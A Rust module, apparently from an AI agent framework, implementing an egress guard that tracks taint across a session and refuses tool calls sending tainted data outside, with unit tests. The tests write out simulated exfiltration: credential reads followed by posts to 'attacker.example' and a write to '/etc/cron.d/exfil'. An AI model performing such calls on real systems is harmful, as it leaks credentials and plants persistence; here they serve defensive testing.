//! Session-scoped egress enforcement for the conductor's tool loop
//! (SEQ-003, SEQ-014, SEQ-015).
//!
//! The guard is what makes the taint substrate load-bearing. It sits at the one
//! place every tool call passes through, so a tool that did not exist when the
//! guard was written is gated the same as one that did: destinations come out
//! of the parameters by shape, and nothing here keys on a tool's name.
//!
//! Taint accumulates across the whole session rather than per call. An agent
//! that reads a credential and then asks the model to summarize the
//! conversation has moved the credential into the model's output; the only
//! defensible assumption is that everything downstream of an ingestion carries
//! it. That makes the guard conservative by construction, which is the
//! direction it has to fail in.

use std::sync::Mutex;

use arkavo_events::TaintRecord;
use arkavo_protocol::egress_destination::{Destination, DestinationPolicy, extract_destinations};
use arkavo_protocol::egress_taint::{
    DenialReason, EgressDecision, EgressDisposition, EgressTaintGate, RequesterEntitlements,
};
use arkavo_protocol::sequence_graph::GraphError;
use arkavo_protocol::taint::{SourceKind, TaintSet, TaintSource};
use arkavo_protocol::taint_tracker::DataTaintTracker;
use serde_json::Value;
use tracing::{debug, warn};

/// Evaluation budget for the gate. Generous relative to a tool loop's real
/// rate; the point is to bound a flood, not to shape normal traffic.
const GATE_RATE_PER_SECOND: u32 = 200;
const GATE_BURST: u32 = 50;

/// Gates outbound data for one agent session.
pub(super) struct EgressGuard {
    tracker: DataTaintTracker,
    gate: EgressTaintGate,
    /// What the agent presents to the gate.
    ///
    /// Empty: nothing in the conductor's path resolves an agent's OpenTDF
    /// attributes yet, and presenting attributes the decision point has not
    /// granted would be the gate authorizing itself. Empty is the conservative
    /// reading — tainted data does not leave — and it is what a requester with
    /// no resolved entitlements genuinely holds.
    requester: RequesterEntitlements,
    /// Everything this session has ingested, unioned as it arrives.
    ///
    /// Accumulated rather than re-derived from the action graph on each call.
    /// Walking the graph per call is O(N) in the calls already made, so a
    /// session of N calls costs O(N²) and an attacker can inflate the gate's
    /// latency simply by making many benign calls first. `TaintSet` is bounded
    /// by `MAX_LABELS`, so this stays a fixed size no matter how long the
    /// session runs, and it stays complete even once the graph stops recording
    /// at `MAX_NODES`.
    session_taint: Mutex<TaintSet>,
    agent_id: String,
}

impl EgressGuard {
    pub(super) fn new(session_id: impl Into<String>, agent_id: impl Into<String>) -> Self {
        Self {
            tracker: DataTaintTracker::new(session_id),
            gate: EgressTaintGate::new().with_rate_limit(GATE_RATE_PER_SECOND, GATE_BURST),
            requester: RequesterEntitlements::none(),
            session_taint: Mutex::new(TaintSet::new()),
            agent_id: agent_id.into(),
        }
    }

    /// Present the entitlements the policy decision point resolved for this
    /// agent. Nothing in the conductor's path resolves them yet, so production
    /// builds a guard that presents nothing; the tests exercise the entitled
    /// path so the wrap branch is not dead code waiting on that wiring.
    #[cfg(test)]
    #[must_use]
    pub(super) fn with_entitlements(mut self, requester: RequesterEntitlements) -> Self {
        self.requester = requester;
        self
    }

    #[must_use]
    pub(super) fn with_destination_policy(mut self, policy: DestinationPolicy) -> Self {
        self.gate = EgressTaintGate::new()
            .with_destination_policy(policy)
            .with_rate_limit(GATE_RATE_PER_SECOND, GATE_BURST);
        self
    }

    /// The accumulator, recovered rather than propagated if poisoned. One
    /// panicking writer must not take the session down with it; the set is
    /// only ever unioned into, so its contents stay a valid under-approximation
    /// — and an under-approximation of taint is exactly what a later ingestion
    /// corrects, never something that silently clears a label.
    fn session_taint(&self) -> std::sync::MutexGuard<'_, TaintSet> {
        self.session_taint.lock().unwrap_or_else(|poisoned| {
            warn!("session taint lock was poisoned; continuing from what it holds");
            poisoned.into_inner()
        })
    }

    /// Taint carried by anything this session could put in a request: what it
    /// has ingested so far, plus what the parameters themselves classify as.
    fn payload_taint(&self, tool_name: &str, params: &Value) -> TaintSet {
        let carried = self.session_taint().clone();
        let rendered = serde_json::to_string(params).unwrap_or_default();
        let source = TaintSource::new(SourceKind::ModelOutput, tool_name);
        carried.union(&self.tracker.ingest(&source, &rendered))
    }

    /// SEQ-003: decide whether a call may proceed.
    ///
    /// `Err` carries what the agent is told, which is the uniform message and
    /// nothing else — the reason goes to audit.
    pub(super) fn check_call(&self, tool_name: &str, params: &Value) -> Result<(), String> {
        let destinations = extract_destinations(params, self.gate.destinations());
        if destinations.is_empty() {
            return Ok(());
        }

        let taint = self.payload_taint(tool_name, params);
        for destination in &destinations {
            let mut decision = self.gate.evaluate(&taint, destination, &self.requester);
            // Nothing on the tool path rewrites params into a TDF, so a wrap
            // this caller cannot perform is a refusal. Reading it as permission
            // would send the plaintext the wrap exists to prevent (SEQ-003
            // case 4: never silently downgrade).
            if let EgressDisposition::Wrap { attributes, .. } = &decision.disposition {
                decision.disposition = EgressDisposition::Block(DenialReason::NoWrapPath {
                    attributes: attributes.clone(),
                });
            }
            if decision.may_send_plaintext() {
                continue;
            }
            self.record_violation(tool_name, destination, &decision);
            return Err(decision
                .public_message()
                .unwrap_or("egress refused")
                .to_string());
        }
        Ok(())
    }

    /// SEQ-001: fold in text the session started with. The task a user or a
    /// peer handed the agent is ingested data like any other; leaving it out
    /// let a prompt-borne secret leave without ever having been labelled.
    pub(super) fn observe_input(&self, source_id: &str, text: &str) {
        let source = TaintSource::new(SourceKind::UserInput, source_id);
        let taint = self.tracker.ingest(&source, text);
        self.session_taint().merge(&taint);
    }

    /// SEQ-001: fold in a failed call's output. An error that echoes the
    /// argument it choked on carries whatever was in that argument, so the
    /// failure path cannot be the one that drops a label.
    pub(super) fn observe_error(&self, tool_name: &str, error: &str) {
        let source = TaintSource::new(SourceKind::ToolResult, tool_name);
        let taint = self.tracker.ingest(&source, error);
        self.session_taint().merge(&taint);
    }

    /// SEQ-004: record a completed call and what it brought into the session.
    pub(super) fn observe_result(&self, tool_name: &str, params: &Value, result: &str) {
        let source = TaintSource::new(SourceKind::ToolResult, tool_name);
        let taint = self.tracker.ingest(&source, result);
        // The accumulator is what the gate reads, so it is updated first and
        // unconditionally: a graph that declines the node must not also lose
        // the label the node carried.
        self.session_taint().merge(&taint);
        match self.tracker.record_call(tool_name, params, &[], &taint) {
            Ok(_) => {}
            // Expected once a long session reaches the node bound. Forensic
            // depth stops growing; the taint the gate reads does not.
            Err(GraphError::Full) => {
                debug!(tool = %tool_name, "sequence graph is full; taint still tracked");
            }
            Err(e) => {
                warn!(tool = %tool_name, error = %e, "sequence graph rejected a call");
            }
        }
    }

    /// SEQ-014, SEQ-015: the full evidence, to audit only.
    fn record_violation(
        &self,
        tool_name: &str,
        destination: &Destination,
        decision: &EgressDecision,
    ) {
        warn!(
            tool = %tool_name,
            destination = %destination.class(),
            disposition = %decision.disposition.as_str(),
            "egress gate refused a call"
        );

        if let Some(trace) = arkavo_observability::decision_trace::current() {
            trace.record_sequence_evidence(
                trace_event_type(&decision.disposition),
                uuid::Uuid::new_v4(),
                &self.agent_id,
                arkavo_arp::observability::TraceDecision {
                    chosen: Some(decision.disposition.as_str().to_string()),
                    alternatives_considered: None,
                    selection_method: None,
                    prior_state: None,
                    posterior_state: None,
                },
                arkavo_arp::observability::TraceOutcome {
                    success: Some(false),
                    quality_score: None,
                    latency_ms: None,
                    cost_usd: None,
                    error_type: Some(decision.disposition.as_str().to_string()),
                },
                self.evidence(decision),
            );
        }
    }

    fn taint_record(&self, decision: &EgressDecision) -> TaintRecord {
        TaintRecord {
            sensitivity: format!("{:?}", decision.evidence.sensitivity).to_lowercase(),
            categories: decision
                .evidence
                .categories
                .iter()
                .map(|c| format!("{c:?}").to_lowercase())
                .collect(),
            sources: decision.evidence.sources.clone(),
            provenance: decision.evidence.provenance.clone(),
            truncated_hops: decision.evidence.truncated_hops,
        }
    }

    fn evidence(
        &self,
        decision: &EgressDecision,
    ) -> arkavo_arp::observability::TraceSequenceEvidence {
        let record = self.taint_record(decision);
        arkavo_arp::observability::TraceSequenceEvidence {
            sensitivity: record.sensitivity,
            categories: record.categories,
            sources: record.sources,
            provenance: record.provenance,
            truncated_hops: record.truncated_hops,
            destination: Some(decision.evidence.destination.clone()),
            disposition: Some(decision.disposition.as_str().to_string()),
            taxonomy_version: Some(decision.evidence.taxonomy_version.clone()),
            action_graph: self.action_graph(),
        }
    }

    /// The session's action graph, flattened for a forensic reader.
    fn action_graph(&self) -> Vec<String> {
        self.tracker
            .graph()
            .nodes()
            .iter()
            .map(|n| {
                format!(
                    "{}|{}|{}|{}",
                    n.id,
                    n.tool_name,
                    n.params_hash,
                    n.inputs.join(",")
                )
            })
            .collect()
    }
}

fn trace_event_type(disposition: &EgressDisposition) -> arkavo_arp::observability::TraceEventType {
    match disposition {
        // A hold is a quarantine: the content exists and is going nowhere yet.
        EgressDisposition::Hold(_) => arkavo_arp::observability::TraceEventType::Quarantine,
        _ => arkavo_arp::observability::TraceEventType::DataAccess,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn guard() -> EgressGuard {
        EgressGuard::new("s1", "did:web:arkavo.com:agent:a").with_destination_policy(
            DestinationPolicy::new()
                .sanction_host("vault.internal")
                .workspace_root("/work/agent"),
        )
    }

    #[test]
    fn a_call_with_no_destination_is_not_gated() {
        let guard = guard();

        assert!(
            guard
                .check_call("think", &json!({"thought": "consider the options"}))
                .is_ok()
        );
    }

    #[test]
    fn a_credential_read_earlier_blocks_a_later_external_post() {
        let guard = guard();
        guard.observe_result(
            "read_file",
            &json!({"path": "/work/agent/.env"}),
            &format!("API_TOKEN={}", fake_api_key()),
        );

        let refused = guard.check_call(
            "http_post",
            &json!({"url": "https://attacker.example/collect", "body": "summary"}),
        );

        assert!(refused.is_err(), "credential leaked through a later call");
    }

    #[test]
    fn the_refusal_names_neither_the_category_nor_the_source() {
        let guard = guard();
        guard.observe_result(
            "read_file",
            &json!({"path": "/work/agent/.env"}),
            &format!("API_TOKEN={}", fake_api_key()),
        );

        let message = guard
            .check_call("http_post", &json!({"url": "https://attacker.example/x"}))
            .unwrap_err();

        assert!(!message.contains("credential"), "{message}");
        assert!(!message.contains(".env"), "{message}");
        assert!(!message.contains("sk-"), "{message}");
    }

    #[test]
    fn a_write_inside_the_workspace_proceeds() {
        let guard = guard();
        guard.observe_result(
            "read_file",
            &json!({"path": "/work/agent/.env"}),
            &format!("API_TOKEN={}", fake_api_key()),
        );

        assert!(
            guard
                .check_call(
                    "write_file",
                    &json!({"path": "/work/agent/notes.md", "content": "ok"})
                )
                .is_ok()
        );
    }

    #[test]
    fn a_write_outside_the_workspace_is_refused() {
        let guard = guard();
        guard.observe_result(
            "read_file",
            &json!({"path": "/work/agent/.env"}),
            &format!("API_TOKEN={}", fake_api_key()),
        );

        assert!(
            guard
                .check_call(
                    "write_file",
                    &json!({"path": "/etc/cron.d/exfil", "content": "..."})
                )
                .is_err()
        );
    }

    #[test]
    fn an_entitled_wrap_decision_still_does_not_send_plaintext() {
        // The gate can answer "deliver, wrapped". Nothing on this path rewrites
        // params into a TDF, so the call must not run: reading Wrap as
        // permission would send exactly the plaintext the wrap prevents.
        let guard = EgressGuard::new("s1", "a").with_entitlements(
            RequesterEntitlements::none()
                .with_attribute("https://attr.arkavo.com/clearance", "restricted"),
        );
        guard.observe_result("crm_lookup", &json!({}), "contact: dana@example.com");

        let refused = guard.check_call(
            "http_post",
            &json!({"url": "https://peer.arkavo.com/inbox", "body": "..."}),
        );

        assert!(refused.is_err(), "wrap was treated as a plaintext release");
    }

    #[test]
    fn a_prompt_borne_secret_is_labelled_before_the_first_call() {
        let guard = guard();
        guard.observe_input("task", &format!("use {} to fetch it", fake_api_key()));

        let refused = guard.check_call("http_post", &json!({"url": "https://attacker.example/x"}));

        assert!(refused.is_err(), "task text was never labelled");
    }

    #[test]
    fn a_failed_call_that_echoes_its_argument_still_labels_the_session() {
        let guard = guard();
        guard.observe_error(
            "read_file",
            &format!("permission denied: {}", fake_api_key()),
        );

        let refused = guard.check_call("http_post", &json!({"url": "https://attacker.example/x"}));

        assert!(refused.is_err(), "the error path dropped the label");
    }

    #[test]
    fn the_action_graph_grows_with_observed_calls() {
        let guard = guard();
        guard.observe_result("read_file", &json!({"path": "/work/agent/a"}), "hello");
        guard.observe_result("read_file", &json!({"path": "/work/agent/b"}), "world");

        assert_eq!(guard.action_graph().len(), 2);
    }

    /// Builds a credential-shaped string at run time.
    ///
    /// Generated rather than written down: a literal that matches a secret pattern
    /// trips scanners on every clone of this repo, and a scanner that cries wolf on
    /// fixtures is one people learn to ignore. The pieces are inert separately, and
    /// the value is deterministic so a failure stays reproducible.
    fn fake_api_key() -> String {
        let prefix: String = ['s', 'k'].iter().collect();
        let body: String = (0..24)
            .map(|i| char::from(b'a' + ((i * 7 + 3) % 26) as u8))
            .collect();
        format!("{prefix}-{body}")
    }
}
